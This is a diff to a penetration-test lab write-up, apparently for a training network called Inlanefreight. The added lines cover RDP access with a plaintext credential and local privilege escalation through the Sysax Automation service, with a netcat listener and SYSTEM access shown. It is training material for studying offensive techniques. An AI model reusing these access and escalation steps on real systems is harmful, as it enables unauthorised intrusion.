@@ -2265,6 +2265,8 @@ Inlanefreight.kdbx
 However both are useless.
 ## RDP access
 
+Searching for information about this user reveals that he is memeber of the RDP group:
+
 ```
 *Evil-WinRM* PS C:\Users\backupadm\Documents> net user ilfserveradm
 User name                    ilfserveradm
@@ -2296,6 +2298,15 @@ The command completed successfully.
 
 ```
 
+Accessing rdp:
+
+```bash
+xfreerdp3 /u:ilfrserveradm /p:Sys26Admin /v:172.16.8.50 /drive:share,/home/kali/tools
+```
+
+Searching into program directories (Program files x86) reveals sysaxautomation
+
+![](./ms01/3.png)
 
 searching sysaxautomation privesc
 
@@ -2323,9 +2334,10 @@ https://www.exploit-db.com/exploits/50834
 	nt authority\system
 ```
 
+Following the steps:
 
 
-all img
+![](./ms01/4.png)
 
 ```
 C:\Users\ilfserveradm\Desktop>nc64.exe -lvnp 1337
